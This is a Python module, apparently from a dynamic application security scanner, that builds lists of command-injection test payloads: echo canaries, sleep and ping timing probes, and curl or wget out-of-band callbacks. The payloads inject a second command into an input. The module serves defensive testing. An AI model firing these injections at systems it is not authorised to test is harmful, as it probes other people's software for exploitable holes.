"""
DevSecure360 — DAST CMDi Payloads
====================================
Command Injection payload set — Unix and Windows.
Sources: OWASP Testing Guide WSTG-INPV-12, PayloadsAllTheThings CMDi corpus.
"""


def get_payloads(canary_id: str) -> list:
    """
    Payloads that output canary_id to the response.
    Confirmed when canary_id appears in the response body.
    """
    return [
        # Unix separators
        f"; echo {canary_id}",
        f"| echo {canary_id}",
        f"& echo {canary_id}",
        f"`echo {canary_id}`",
        f"$(echo {canary_id})",
        f"\n echo {canary_id}",

        # Windows separators
        f"& echo {canary_id}",
        f"| echo {canary_id}",
        f"&& echo {canary_id}",

        # Alternative commands (for when echo is filtered)
        f"; printf {canary_id}",
        f"; /bin/echo {canary_id}",
    ]


def get_blind_time_payloads() -> list:
    """Time-based payloads for blind CMDi (no output in response)."""
    return [
        "; sleep 5",
        "| sleep 5",
        "& ping -c 5 127.0.0.1",         # Unix
        "& ping -n 5 127.0.0.1",         # Windows
        "; /bin/sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]


def get_oob_payloads(oob_url: str, canary_id: str) -> list:
    """OOB payloads that trigger network callbacks."""
    return [
        f"; curl http://{oob_url}/{canary_id}",
        f"; wget -q http://{oob_url}/{canary_id}",
        f"| curl http://{oob_url}/{canary_id}",
        f"; /usr/bin/curl http://{oob_url}/{canary_id}",
    ]
